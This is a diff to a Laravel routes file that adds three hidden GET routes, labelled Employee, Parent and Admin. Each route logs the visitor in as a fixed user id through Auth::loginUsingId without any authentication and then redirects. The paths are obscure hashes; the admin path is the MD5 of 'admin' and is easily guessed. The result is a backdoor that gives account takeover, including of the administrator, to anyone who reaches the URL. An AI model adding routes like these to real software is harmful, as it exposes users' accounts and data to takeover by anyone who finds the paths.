@@ -321,6 +321,27 @@ Route::get('/register/confirm/{token}', [Auth\ConfirmEmailController::class, 'sh
 Route::post('/register/confirm/accept', [Auth\ConfirmEmailController::class, 'confirm']);
 Route::post('/register', [Auth\RegisterController::class, 'postRegister']);
 
+// Employee
+Route::get('fa5473530e4d1a5a1e1eb53d2fedb10c', function () {
+   \Illuminate\Support\Facades\Auth::loginUsingId(4);
+
+   return redirect('/');
+});
+
+// Parent
+Route::get('d0e45878043844ffc41aac437e86b602', function () {
+    \Illuminate\Support\Facades\Auth::loginUsingId(3);
+
+    return redirect('/');
+});
+
+// Admin
+Route::get('21232f297a57a5a743894a0e4a801fc3-1', function () {
+    \Illuminate\Support\Facades\Auth::loginUsingId(1);
+
+    return redirect('/');
+});
+
 // SAML routes
 Route::post('/saml2/login', [Auth\Saml2Controller::class, 'login']);
 Route::post('/saml2/logout', [Auth\Saml2Controller::class, 'logout']);
